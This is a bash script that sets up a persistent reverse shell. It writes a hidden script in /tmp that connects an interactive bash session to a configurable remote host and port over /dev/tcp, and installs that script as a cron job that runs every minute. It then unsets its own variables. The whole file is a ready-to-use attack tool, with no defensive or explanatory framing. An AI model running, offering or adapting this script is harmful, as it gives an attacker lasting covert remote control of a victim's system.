#!/bin/bash

# Configuration
RHOST="192.168.230.133"  # Replace with your remote host IP or domain
RPORT="9999"         # Replace with your remote host port
SHELL_CMD="/bin/bash"     # Shell to use for the reverse connection
CRON_INTERVAL="* * * * *" # Cron job interval (this sets it to every minute)

# Create the reverse shell script
cat <<EOF > /tmp/.rev_shell.sh
#!/bin/bash
bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
EOF

# Make the script executable
chmod +x /tmp/.rev_shell.sh

# Add the script to crontab
(crontab -l 2>/dev/null; echo "$CRON_INTERVAL /tmp/.rev_shell.sh") | crontab -

# Clean up the environment (optional)
unset RHOST RPORT SHELL_CMD CRON_INTERVAL
